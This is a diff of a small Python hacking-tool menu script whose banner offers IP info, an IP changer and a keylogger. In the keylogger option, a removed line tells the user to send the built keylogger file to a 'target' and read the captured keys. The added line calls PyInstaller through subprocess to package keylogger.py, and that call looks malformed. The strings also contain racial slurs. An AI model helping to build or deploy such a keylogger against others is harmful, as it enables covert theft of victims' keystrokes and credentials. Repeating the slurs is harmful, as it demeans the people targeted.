@@ -122,7 +122,7 @@ def banner ():
 ██║     ██║██║ ╚████║██║ ╚████║██║  ██║╚██████╔╝    ╚██████╔╝███████║██║██║ ╚████║   ██║   
 ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝      ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝                                                                                              
 
-Author : FINN\tCountry : Cambodia\tYear : 2025\n1. Ip_info\n2. Ip Changer\n3. Key Logger\n4. Blue Army\n5. Purple Army
+Author : FINN\tCountry : Cambodia\tYear : 2025\n1. Ip_info\n2. Ip Changer\n3. Key Logger\n4. Under Develop\n5. Under Develop
     """)
 
 def Ip_changer():
@@ -203,7 +203,7 @@ elif x == 3:
 	if hen_gem == "start":
 		time.sleep(5)
 		print("waiting for the tool to start : ")
-		print("go into the file -> and go into the dist -> and send the keylogger file to your target -> and then go to keylogs.txt and see the result Thank you nigga")
+		subprocess.run(["pip install pyinstaller --break-system-packages" , "python3 -m PyInstaller keylogger.py"])
 elif x == 4:
     gogo()
     x == input("Not yet nigger")
